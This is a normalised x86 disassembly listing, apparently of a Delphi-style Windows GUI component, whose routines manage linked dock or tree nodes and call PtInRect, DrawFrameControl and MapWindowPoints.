mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_448b08
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_448294
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_449b34
mov edx esi
mov eax ebx
call sub_448b08
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_43fb54
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_448270
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_43fb40
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_4483f4
mov edx eax
mov eax edi
call sub_4487e4
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_4483f4
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_4483f4
mov edx eax
mov eax edi
call sub_4487e4
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_4483f4
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_448e1c
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_448fc4
jmp r-xdata
sub_448e1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_448270
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_4487bc
mov edx eax
mov eax ebx
call sub_4487e4
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_4487e4
mov eax [ esi + 0x64 ]
call sub_4487bc
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_449e8c
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_448b70
mov eax [ esi + 0x64 ]
call sub_4487bc
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_449e8c
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_448b70
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_44a210
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_448b70
mov eax [ esi + 0x64 ]
call sub_4487bc
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_44a344
xor edx edx
mov eax esi
call sub_448b70
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_4487e4
adc edx 0x0
mov eax ebx
call sub_4484a4
mov eax ebx
call sub_448834
push esi
push sub_44a344
xor edx edx
mov eax esi
call sub_448b70
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_448fc4
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_4484a4
mov eax [ ebx + 0x14 ]
call sub_448834
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_44903c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_4487bc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_4487bc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_4487bc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_448388
mov esi eax
mov edx 0x2
mov eax ebx
call sub_448388
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_4487bc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_448894
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4488bc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_448894
call sub_44903c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4488bc
call sub_44903c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_4483f4
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_4483f4
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_449268
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4430fc
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_4430c0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_416a38
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4492fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_449268
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_4488bc
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_448b08
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_4488bc
call sub_44903c
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_449384
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403f40
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_40458c
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_4493cc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4495c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_449a9c
mov eax [ ebp - 0x8 ]
call sub_448a98
xor edx edx
push ebp
push sub_4495a7
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4495ae
mov eax [ ebp - 0x8 ]
call sub_448a9c
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_448270
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_449384
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403368
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_448590
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_449384
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_43fad0
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_4408e4
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_40316c
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_4495d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_416a60
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4229f0
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44962c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_421ef8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_42266c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_42260c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_42260c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_421ef8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_42260c
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_42260c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4496b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_4495d4
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_44962c
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_44962c
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_4495d4
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_44962c
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_44962c
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_449790
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422348
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4498e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43e78c
mov eax [ ebp - 0x4 ]
call sub_422644
xor eax eax
push ebp
push sub_4498c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_422a70
xor eax eax
push ebp
push sub_4498ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_4430fc
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4498b3
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_422a70
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4430c0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43f550
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_4498f4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_444f80
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_43f5f8
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_43f5b4
mov ecx eax
xor edx edx
xor eax eax
call sub_416a60
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_446450
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416a88
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_449a68
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_449a68
pop ecx
mov eax ebx
call sub_40316c
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_449a68
pop ecx
sub_449a9c
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_449a68
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_40316c
xor eax eax
mov [ esi + 0x64 ] eax
sub_449af8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448b08
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_449b34
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_449b34
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_449da1
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
